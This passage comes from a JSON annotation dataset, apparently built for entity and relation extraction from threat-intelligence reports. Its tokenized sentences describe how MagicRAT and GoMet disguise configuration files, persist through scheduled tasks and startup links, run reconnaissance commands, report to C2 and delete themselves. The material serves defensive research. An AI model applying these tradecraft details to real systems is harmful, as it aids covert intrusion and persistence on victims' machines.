"3_0"}]], "labels": [{"r": "EX", "evidence": [6], "h": 2, "t": 3}]}, {"title": "010-2", "sents": [["The", "configuration", "is", "dynamically", "stored", "in", "a", "QSettings", "class", "eventually", "being", "saved", "to", "disk", ",", "a", "typical", "functionality", "provided", "by", "that", "class", "."], ["The", "malware", "configuration", "(", "containing", "author-defined", "QSettings", ")", "is", "stored", "in", "the", "file", "``", "visual.1991-06.com.microsoft_sd.kit", "''", "in", "the", "path", "``", "\\ProgramData\\WindowsSoftwareToolkit", "''", "-", "names", "and", "paths", "obviously", "chosen", "to", "trick", "the", "victim", "into", "believing", "they", "were", "part", "of", "the", "operating", "system", "."], ["[", "os", "]", "which", "contains", "the", "command", "and", "control", "(", "C2", ")", "URLs", "."], ["All", "analyzed", "samples", "had", "three", "encoded", "C2", "URLs", "that", "are", "used", "to", "register", "infections", "and", "then", "receive", "commands", "to", "execute", "on", "the", "infected", "endpoint", "."], ["The", "URLs", "are", "stored", "in", "the", "configuration", "file", "with", "the", "keys", "``", "windows", "''", ",", "``", "linux", "''", "and", "``", "mac", ".", "''"], ["Upon", "execution", ",", "MagicRAT", "achieves", "persistence", "for", "itself", "by", "executing", "a", "hardcoded", "command", "that", "creates", "scheduled", "tasks", "on", "the", "victim", "machine", "."], ["Scheduled", "task", "starting", "at", "a", "specific", "time", "[", "T1053/005", "]"], ["Scheduled", "task", "starting", "at", "a", "different", "time", "an", "path", "[", "T1053/005", "]"]], "vertexSet": [[{"type": "MF", "sent_id": 3, "global_pos": [81, 81], "name": "samples", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [130, 130], "name": "MagicRAT", "pos": [3, 4], "index": "1_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [139, 139], "name": "command", "pos": [12, 13], "index": "2_0"}]], "labels": [{"r": "EX", "evidence": [5], "h": 1, "t": 2}]}, {"title": "010-3", "sents": [["The", "malware", "configuration", "(", "containing", "author-defined", "QSettings", ")", "is", "stored", "in", "the", "file", "``", "visual.1991-06.com.microsoft_sd.kit", "''", "in", "the", "path", "``", "\\ProgramData\\WindowsSoftwareToolkit", "''", "-", "names", "and", "paths", "obviously", "chosen", "to", "trick", "the", "victim", "into", "believing", "they", "were", "part", "of", "the", "operating", "system", "."], ["[", "os", "]", "which", "contains", "the", "command", "and", "control", "(", "C2", ")", "URLs", "."], ["All", "analyzed", "samples", "had", "three", "encoded", "C2", "URLs", "that", "are", "used", "to", "register", "infections", "and", "then", "receive", "commands", "to", "execute", "on", "the", "infected", "endpoint", "."], ["The", "URLs", "are", "stored", "in", "the", "configuration", "file", "with", "the", "keys", "``", "windows", "''", ",", "``", "linux", "''", "and", "``", "mac", ".", "''"], ["Upon", "execution", ",", "MagicRAT", "achieves", "persistence", "for", "itself", "by", "executing", "a", "hardcoded", "command", "that", "creates", "scheduled", "tasks", "on", "the", "victim", "machine", "."], ["Scheduled", "task", "starting", "at", "a", "specific", "time", "[", "T1053/005", "]"], ["Scheduled", "task", "starting", "at", "a", "different", "time", "an", "path", "[", "T1053/005", "]"], ["Link", "created", "on", "startup", "folder", "[", "T1547/001", "]"]], "vertexSet": [[{"type": "MF", "sent_id": 2, "global_pos": [58, 58], "name": "samples", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [107, 107], "name": "MagicRAT", "pos": [3, 4], "index": "1_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [116, 116], "name": "command", "pos": [12, 13], "index": "2_0"}]], "labels": [{"r": "EX", "evidence": [4], "h": 1, "t": 2}]}, {"title": "010-4", "sents": [["[", "os", "]", "which", "contains", "the", "command", "and", "control", "(", "C2", ")", "URLs", "."], ["All", "analyzed", "samples", "had", "three", "encoded", "C2", "URLs", "that", "are", "used", "to", "register", "infections", "and", "then", "receive", "commands", "to", "execute", "on", "the", "infected", "endpoint", "."], ["The", "URLs", "are", "stored", "in", "the", "configuration", "file", "with", "the", "keys", "``", "windows", "''", ",", "``", "linux", "''", "and", "``", "mac", ".", "''"], ["Upon", "execution", ",", "MagicRAT", "achieves", "persistence", "for", "itself", "by", "executing", "a", "hardcoded", "command", "that", "creates", "scheduled", "tasks", "on", "the", "victim", "machine", "."], ["Scheduled", "task", "starting", "at", "a", "specific", "time", "[", "T1053/005", "]"], ["Scheduled", "task", "starting", "at", "a", "different", "time", "an", "path", "[", "T1053/005", "]"], ["Link", "created", "on", "startup", "folder", "[", "T1547/001", "]"], ["Upon", "achieving", "persistence", ",", "the", "RAT", "contacts", "the", "C2", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [16, 16], "name": "samples", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [65, 65], "name": "MagicRAT", "pos": [3, 4], "index": "1_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [74, 74], "name": "command", "pos": [12, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [119, 119], "name": "RAT", "pos": [5, 6], "index": "3_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [122, 122], "name": "C2", "pos": [8, 9], "index": "4_0"}]], "labels": [{"r": "EX", "evidence": [3], "h": 1, "t": 2}, {"r": "CO", "evidence": [3, 4, 5, 6, 7], "h": 1, "t": 3}, {"r": "ST", "evidence": [7], "h": 3, "t": 4}, {"r": "RF", "evidence": [7], "h": 3, "t": 4}]}, {"title": "010-5", "sents": [["All", "analyzed", "samples", "had", "three", "encoded", "C2", "URLs", "that", "are", "used", "to", "register", "infections", "and", "then", "receive", "commands", "to", "execute", "on", "the", "infected", "endpoint", "."], ["The", "URLs", "are", "stored", "in", "the", "configuration", "file", "with", "the", "keys", "``", "windows", "''", ",", "``", "linux", "''", "and", "``", "mac", ".", "''"], ["Upon", "execution", ",", "MagicRAT", "achieves", "persistence", "for", "itself", "by", "executing", "a", "hardcoded", "command", "that", "creates", "scheduled", "tasks", "on", "the", "victim", "machine", "."], ["Scheduled", "task", "starting", "at", "a", "specific", "time", "[", "T1053/005", "]"], ["Scheduled", "task", "starting", "at", "a", "different", "time", "an", "path", "[", "T1053/005", "]"], ["Link", "created", "on", "startup", "folder", "[", "T1547/001", "]"], ["Upon", "achieving", "persistence", ",", "the", "RAT", "contacts", "the", "C2", "."], ["During", "the", "initial", "stages", "of", "execution", ",", "MagicRAT", "will", "perform", "just", "enough", "system", "reconnaissance", "to", "identify", "the", "system", "and", "environment", "in", "which", "the", "attackers", "are", "operating", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "samples", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [51, 51], "name": "MagicRAT", "pos": [3, 4], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [60, 60], "name": "command", "pos": [12, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [105, 105], "name": "RAT", "pos": [5, 6], "index": "3_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [108, 108], "name": "C2", "pos": [8, 9], "index": "4_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [117, 117], "name": "MagicRAT", "pos": [7, 8], "index": "5_0"}]], "labels": [{"r": "EX", "evidence": [2], "h": 1, "t": 2}, {"r": "CO", "evidence": [2, 3, 4, 5, 6], "h": 1, "t": 3}, {"r": "CO", "evidence": [2, 3, 4, 5, 6, 7], "h": 1, "t": 5}, {"r": "ST", "evidence": [6], "h": 3, "t": 4}, {"r": "RF", "evidence": [6], "h": 3, "t": 4}]}, {"title": "010-6", "sents": [["The", "URLs", "are", "stored", "in", "the", "configuration", "file", "with", "the", "keys", "``", "windows", "''", ",", "``", "linux", "''", "and", "``", "mac", ".", "''"], ["Upon", "execution", ",", "MagicRAT", "achieves", "persistence", "for", "itself", "by", "executing", "a", "hardcoded", "command", "that", "creates", "scheduled", "tasks", "on", "the", "victim", "machine", "."], ["Scheduled", "task", "starting", "at", "a", "specific", "time", "[", "T1053/005", "]"], ["Scheduled", "task", "starting", "at", "a", "different", "time", "an", "path", "[", "T1053/005", "]"], ["Link", "created", "on", "startup", "folder", "[", "T1547/001", "]"], ["Upon", "achieving", "persistence", ",", "the", "RAT", "contacts", "the", "C2", "."], ["During", "the", "initial", "stages", "of", "execution", ",", "MagicRAT", "will", "perform", "just", "enough", "system", "reconnaissance", "to", "identify", "the", "system", "and", "environment", "in", "which", "the", "attackers", "are", "operating", "."], ["This", "is", "done", "by", "executing", "the", "commands", "whoami", ",", "systeminfo", "and", "ipconfig", "/all", "to", "get", "system", "information", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "MagicRAT", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [35, 35], "name": "command", "pos": [12, 13], "index": "1_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [80, 80], "name": "RAT", "pos": [5, 6], "index": "2_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [83, 83], "name": "C2", "pos": [8, 9], "index": "3_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [92, 92], "name": "MagicRAT", "pos": [7, 8], "index": "4_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [118, 118], "name": "commands", "pos": [6, 7], "index": "5_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [119, 119], "name": "whoami", "pos": [7, 8], "index": "6_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [121, 121], "name": "systeminfo", "pos": [9, 10], "index": "7_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [123, 123], "name": "ipconfig", "pos": [11, 12], "index": "8_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [127, 127], "name": "system information", "pos": [15, 17], "index": "9_0"}]], "labels": [{"r": "EX", "evidence": [1], "h": 0, "t": 1}, {"r": "CO", "evidence": [1, 2, 3, 4, 5], "h": 0, "t": 2}, {"r": "CO", "evidence": [1, 2, 3, 4, 5, 6], "h": 0, "t": 4}, {"r": "ST", "evidence": [5], "h": 2, "t": 3}, {"r": "RF", "evidence": [5], "h": 2, "t": 3}, {"r": "EX", "evidence": [6, 7], "h": 4, "t": 5}, {"r": "FR", "evidence": [6, 7], "h": 4, "t": 6}, {"r": "FR", "evidence": [6, 7], "h": 4, "t": 7}, {"r": "FR", "evidence": [6, 7], "h": 4, "t": 8}, {"r": "RD", "evidence": [6, 7], "h": 4, "t": 9}]}, {"title": "010-7", "sents": [["Upon", "execution", ",", "MagicRAT", "achieves", "persistence", "for", "itself", "by", "executing", "a", "hardcoded", "command", "that", "creates", "scheduled", "tasks", "on", "the", "victim", "machine", "."], ["Scheduled", "task", "starting", "at", "a", "specific", "time", "[", "T1053/005", "]"], ["Scheduled", "task", "starting", "at", "a", "different", "time", "an", "path", "[", "T1053/005", "]"], ["Link", "created", "on", "startup", "folder", "[", "T1547/001", "]"], ["Upon", "achieving", "persistence", ",", "the", "RAT", "contacts", "the", "C2", "."], ["During", "the", "initial", "stages", "of", "execution", ",", "MagicRAT", "will", "perform", "just", "enough", "system", "reconnaissance", "to", "identify", "the", "system", "and", "environment", "in", "which", "the", "attackers", "are", "operating", "."], ["This", "is", "done", "by", "executing", "the", "commands", "whoami", ",", "systeminfo", "and", "ipconfig", "/all", "to", "get", "system", "information", "."], ["The", "last", "command", "has", "its", "results", "returned", "via", "the", "upload", "of", "the", "file", "zero_dump.mix", "to", "the", "C2", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "MagicRAT", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "command", "pos": [12, 13], "index": "1_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [57, 57], "name": "RAT", "pos": [5, 6], "index": "2_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [60, 60], "name": "C2", "pos": [8, 9], "index": "3_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [69, 69], "name": "MagicRAT", "pos": [7, 8], "index": "4_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [95, 95], "name": "commands", "pos": [6, 7], "index": "5_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [96, 96], "name": "whoami", "pos": [7, 8], "index": "6_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [98, 98], "name": "systeminfo", "pos": [9, 10], "index": "7_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [100, 100], "name": "ipconfig", "pos": [11, 12], "index": "8_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [104, 104], "name": "system information", "pos": [15, 17], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [120, 120], "name": "zero_dump.mix", "pos": [13, 14], "index": "10_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [123, 123], "name": "C2", "pos": [16, 17], "index": "11_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5], "h": 0, "t": 4}, {"r": "ST", "evidence": [4], "h": 2, "t": 3}, {"r": "RF", "evidence": [4], "h": 2, "t": 3}, {"r": "EX", "evidence": [5, 6], "h": 4, "t": 5}, {"r": "FR", "evidence": [5, 6], "h": 4, "t": 6}, {"r": "FR", "evidence": [5, 6], "h": 4, "t": 7}, {"r": "FR", "evidence": [5, 6], "h": 4, "t": 8}, {"r": "RD", "evidence": [5, 6], "h": 4, "t": 9}, {"r": "WR", "evidence": [5, 6, 7], "h": 4, "t": 10}, {"r": "ST", "evidence": [5, 6, 7], "h": 4, "t": 11}]}, {"title": "010-8", "sents": [["Scheduled", "task", "starting", "at", "a", "specific", "time", "[", "T1053/005", "]"], ["Scheduled", "task", "starting", "at", "a", "different", "time", "an", "path", "[", "T1053/005", "]"], ["Link", "created", "on", "startup", "folder", "[", "T1547/001", "]"], ["Upon", "achieving", "persistence", ",", "the", "RAT", "contacts", "the", "C2", "."], ["During", "the", "initial", "stages", "of", "execution", ",", "MagicRAT", "will", "perform", "just", "enough", "system", "reconnaissance", "to", "identify", "the", "system", "and", "environment", "in", "which", "the", "attackers", "are", "operating", "."], ["This", "is", "done", "by", "executing", "the", "commands", "whoami", ",", "systeminfo", "and", "ipconfig", "/all", "to", "get", "system", "information", "."], ["The", "last", "command", "has", "its", "results", "returned", "via", "the", "upload", "of", "the", "file", "zero_dump.mix", "to", "the", "C2", "."], ["The", "operator", "can", "determine", "the", "timing", "for", "the", "implant", "to", "sleep", ",", "change", "the", "C2", "URLs", "and", "delete", "the", "implant", "from", "the", "infected", "system", "."]], "vertexSet": [[{"type": "MP", "sent_id": 3, "global_pos": [35, 35], "name": "RAT", "pos": [5, 6], "index": "0_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [38, 38], "name": "C2", "pos": [8, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [47, 47], "name": "MagicRAT", "pos": [7, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [73, 73], "name": "commands", "pos": [6, 7], "index": "3_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [74, 74], "name": "whoami", "pos": [7, 8], "index": "4_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [76, 76], "name": "systeminfo", "pos": [9, 10], "index": "5_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [78, 78], "name": "ipconfig", "pos": [11, 12], "index": "6_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [82, 82], "name": "system information", "pos": [15, 17], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [98, 98], "name": "zero_dump.mix", "pos": [13, 14], "index": "8_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [101, 101], "name": "C2", "pos": [16, 17], "index": "9_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [104, 104], "name": "operator", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [111, 111], "name": "implant to sleep", "pos": [8, 11], "index": "11_0"}]], "labels": [{"r": "ST", "evidence": [3], "h": 0, "t": 1}, {"r": "RF", "evidence": [3], "h": 0, "t": 1}, {"r": "EX", "evidence": [4, 5], "h": 2, "t": 3}, {"r": "FR", "evidence": [4, 5], "h": 2, "t": 4}, {"r": "FR", "evidence": [4, 5], "h": 2, "t": 5}, {"r": "FR", "evidence": [4, 5], "h": 2, "t": 6}, {"r": "RD", "evidence": [4, 5], "h": 2, "t": 7}, {"r": "WR", "evidence": [4, 5, 6], "h": 2, "t": 8}, {"r": "ST", "evidence": [4, 5, 6], "h": 2, "t": 9}, {"r": "RF", "evidence": [6, 7], "t": 9, "h": 10}, {"r": "RD", "evidence": [7], "h": 10, "t": 11}, {"r": "WR", "evidence": [7], "h": 10, "t": 11}]}, {"title": "010-9", "sents": [["Scheduled", "task", "starting", "at", "a", "different", "time", "an", "path", "[", "T1053/005", "]"], ["Link", "created", "on", "startup", "folder", "[", "T1547/001", "]"], ["Upon", "achieving", "persistence", ",", "the", "RAT", "contacts", "the", "C2", "."], ["During", "the", "initial", "stages", "of", "execution", ",", "MagicRAT", "will", "perform", "just", "enough", "system", "reconnaissance", "to", "identify", "the", "system", "and", "environment", "in", "which", "the", "attackers", "are", "operating", "."], ["This", "is", "done", "by", "executing", "the", "commands", "whoami", ",", "systeminfo", "and", "ipconfig", "/all", "to", "get", "system", "information", "."], ["The", "last", "command", "has", "its", "results", "returned", "via", "the", "upload", "of", "the", "file", "zero_dump.mix", "to", "the", "C2", "."], ["The", "operator", "can", "determine", "the", "timing", "for", "the", "implant", "to", "sleep", ",", "change", "the", "C2", "URLs", "and", "delete", "the", "implant", "from", "the", "infected", "system", "."], ["This", "sample", "now", "consisted", "of", "the", "ability", "to", "delete", "itself", "from", "the", "infected", "endpoint", "using", "a", "BAT", "file", "."]], "vertexSet": [[{"type": "MP", "sent_id": 2, "global_pos": [25, 25], "name": "RAT", "pos": [5, 6], "index": "0_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [28, 28], "name": "C2", "pos": [8, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [37, 37], "name": "MagicRAT", "pos": [7, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [63, 63], "name": "commands", "pos": [6, 7], "index": "3_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [64, 64], "name": "whoami", "pos": [7, 8], "index": "4_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [66, 66], "name": "systeminfo", "pos": [9, 10], "index": "5_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [68, 68], "name": "ipconfig", "pos": [11, 12], "index": "6_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [72, 72], "name": "system information", "pos": [15, 17], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [88, 88], "name": "zero_dump.mix", "pos": [13, 14], "index": "8_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [91, 91], "name": "C2", "pos": [16, 17], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [94, 94], "name": "operator", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [101, 101], "name": "implant to sleep", "pos": [8, 11], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [134, 134], "name": "BAT file", "pos": [16, 18], "index": "12_0"}]], "labels": [{"r": "ST", "evidence": [2], "h": 0, "t": 1}, {"r": "RF", "evidence": [2], "h": 0, "t": 1}, {"r": "EX", "evidence": [3, 4], "h": 2, "t": 3}, {"r": "FR", "evidence": [3, 4], "h": 2, "t": 4}, {"r": "FR", "evidence": [3, 4], "h": 2, "t": 5}, {"r": "FR", "evidence": [3, 4], "h": 2, "t": 6}, {"r": "RD", "evidence": [3, 4], "h": 2, "t": 7}, {"r": "WR", "evidence": [3, 4, 5], "h": 2, "t": 8}, {"r": "ST", "evidence": [3, 4, 5], "h": 2, "t": 9}, {"r": "UK", "evidence": [3, 4, 5, 6, 7], "h": 2, "t": 12}, {"r": "RF", "evidence": [5, 6], "t": 9, "h": 10}, {"r": "RD", "evidence": [6], "h": 10, "t": 11}, {"r": "WR", "evidence": [6], "h": 10, "t": 11}]}, {"title": "065-0", "sents": [["They", "both", "start", "with", "the", "exploitation", "of", "a", "public", "vulnerability", "on", "appliances", "where", "the", "malicious", "actors", "then", "dropped", "GoMet", "as", "a", "backdoor", "."], ["GoMet", "supports", "job", "scheduling", "(", "via", "Cron", "or", "task", "scheduler", "depending", "on", "the", "OS", ")", ",", "single", "command", "execution", ",", "file", "download", ",", "file", "upload", "or", "opening", "a", "shell", "."], ["An", "additional", "notable", "feature", "of", "GoMet", "lies", "in", "its", "ability", "to", "daisy", "chain", "whereby", "the", "attackers", "gain", "access", "to", "a", "network", "or", "machine", "and", "then", "use", "that", "same", "information", "to", "gain", "access", "to", "multiple", "networks", "and", "computers", "connections", "from", "one", "implanted", "host", "to", "another", "."], ["This", "version", "was", "changed", "by", "malicious", "actors", ",", "in", "the", "original", "code", ",", "the", "cronjob", "is", "configured", "to", "be", "executed", "once", "every", "hour", "on", "the", "hour", "."], ["The", "objective", "of", "the", "cron", "job", "defined", "in", "the", "main", "part", "of", "the", "malware", "is", "to", "check", "if", "it", "'s", "connected", "to", "the", "C2", ",", "if", "not", "it", "will", "start", "the", "agent", "component", "again", "and", "connect", "to", "the", "C2", "."], ["The", "picture", "below", "shows", "the", "execution", "flow", "of", "the", "C2", "setup", "routine", "Agent", "."], ["If", "the", "C2", "is", "unreachable", ",", "the", "sample", "will", "sleep", "for", "a", "random", "amount", "of", "time", "between", "five", "and", "10", "minutes", "."], ["GO", "'s", "sleep", "implementation", "uses", "nanoseconds", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "vulnerability", "pos": [9, 10], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "actors", "pos": [15, 16], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [18, 18], "name": "GoMet", "pos": [18, 19], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [21, 21], "name": "backdoor", "pos": [21, 22], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "GoMet", "pos": [0, 1], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [31, 31], "name": "task scheduler", "pos": [8, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [40, 40], "name": "command execution", "pos": [17, 19], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [43, 43], "name": "file download", "pos": [20, 22], "index": "7_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [46, 46], "name": "file upload", "pos": [23, 25], "index": "8_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [49, 49], "name": "opening a shell", "pos": [26, 29], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [58, 58], "name": "GoMet", "pos": [5, 6], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [68, 68], "name": "attackers", "pos": [15, 16], "index": "11_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [70, 70], "name": "access", "pos": [17, 18], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [99, 99], "name": "version", "pos": [1, 2], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [104, 104], "name": "actors", "pos": [6, 7], "index": "14_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [112, 112], "name": "cronjob", "pos": [14, 15], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [129, 129], "name": "cron job", "pos": [4, 6], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [138, 138], "name": "malware", "pos": [13, 14], "index": "17_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [148, 148], "name": "C2", "pos": [23, 24], "index": "18_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [156, 156], "name": "agent component", "pos": [31, 33], "index": "19_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [163, 163], "name": "C2", "pos": [38, 39], "index": "20_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [174, 174], "name": "C2", "pos": [9, 10], "index": "21_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [181, 181], "name": "C2", "pos": [2, 3], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [186, 186], "name": "sample", "pos": [7, 8], "index": "23_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [0], "h": 2, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "CO", "evidence": [0, 1, 2], "h": 2, "t": 10}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 11}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 1, "t": 14}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [1], "h": 4, "t": 6}, {"r": "FR", "evidence": [1], "h": 4, "t": 7}, {"r": "FR", "evidence": [1], "h": 4, "t": 8}, {"r": "FR", "evidence": [1], "h": 4, "t": 9}, {"r": "CD", "evidence": [2], "h": 11, "t": 12}, {"r": "RD", "evidence": [3], "t": 13, "h": 14}, {"r": "WR", "evidence": [3], "t": 13, "h": 14}, {"r": "CO", "evidence": [3], "h": 13, "t": 15}, {"r": "CO", "evidence": [3, 4], "h": 13, "t": 16}, {"r": "RD", "evidence": [4], "t": 16, "h": 17}, {"r": "ST", "evidence": [4], "h": 17, "t": 18}, {"r": "RF", "evidence": [4], "h": 17, "t": 18}, {"r": "FR", "evidence": [4], "h": 17, "t": 19}, {"r": "ST", "evidence": [4], "t": 18, "h": 19}, {"r": "RF", "evidence": [4], "t": 18, "h": 19}, {"r": "ST", "evidence": [4], "h": 19, "t": 20}, {"r": "RF", "evidence": [4], "h": 19, "t": 20}, {"r": "CO", "evidence": [4, 5, 6], "h": 17, "t": 23}, {"r": "CO", "evidence": [5, 6], "h": 21, "t": 22}, {"r": "CO", "evidence": [4, 5], "t": 20, "h": 21}]}, {"title": "065-1", "sents": [["GoMet", "supports", "job", "scheduling", "(", "via", "Cron", "or", "task", "scheduler", "depending", "on", "the", "OS", ")", ",", "single", "command", "execution", ",", "file", "download", ",", "file", "upload", "or", "opening", "a", "shell", "."], ["An", "additional", "notable", "feature", "of", "GoMet", "lies", "in", "its", "ability", "to", "daisy", "chain", "whereby", "the", "attackers", "gain", "access", "to", "a", "network", "or", "machine", "and", "then", "use", "that", "same", "information", "to", "gain", "access", "to", "multiple", "networks", "and", "computers", "connections", "from", "one", "implanted", "host", "to", "another", "."], ["This", "version", "was", "changed", "by", "malicious", "actors", ",", "in", "the", "original", "code", ",", "the", "cronjob", "is", "configured", "to", "be", "executed", "once", "every", "hour", "on", "the", "hour", "."], ["The", "objective", "of", "the", "cron", "job", "defined", "in", "the", "main", "part", "of", "the", "malware", "is", "to", "check", "if", "it", "'s", "connected", "to", "the", "C2", ",", "if", "not", "it", "will", "start", "the", "agent", "component", "again", "and", "connect", "to", "the", "C2", "."], ["The", "picture", "below", "shows", "the", "execution", "flow", "of", "the", "C2", "setup", "routine", "Agent", "."], ["If", "the", "C2", "is", "unreachable", ",", "the", "sample", "will", "sleep", "for", "a", "random", "amount", "of", "time", "between", "five", "and", "10", "minutes", "."], ["GO", "'s", "sleep", "implementation", "uses", "nanoseconds", "."], ["The", "Pseudo", "Code", "would", "look", "like", "the", "following", ":", "time_Sleep", "(", "1000000000", "*", "(", "rnd_val", "+", "300", ")", ")", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "GoMet", "pos": [0, 1], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "task scheduler", "pos": [8, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [17, 17], "name": "command execution", "pos": [17, 19], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [20, 20], "name": "file download", "pos": [20, 22], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [23, 23], "name": "file upload", "pos": [23, 25], "index": "4_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [26, 26], "name": "opening a shell", "pos": [26, 29], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [35, 35], "name": "GoMet", "pos": [5, 6], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [45, 45], "name": "attackers", "pos": [15, 16], "index": "7_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [47, 47], "name": "access", "pos": [17, 18], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [76, 76], "name": "version", "pos": [1, 2], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [81, 81], "name": "actors", "pos": [6, 7], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [89, 89], "name": "cronjob", "pos": [14, 15], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [106, 106], "name": "cron job", "pos": [4, 6], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [115, 115], "name": "malware", "pos": [13, 14], "index": "13_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [125, 125], "name": "C2", "pos": [23, 24], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [133, 133], "name": "agent component", "pos": [31, 33], "index": "15_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [140, 140], "name": "C2", "pos": [38, 39], "index": "16_0"}], [{"type": "SO", 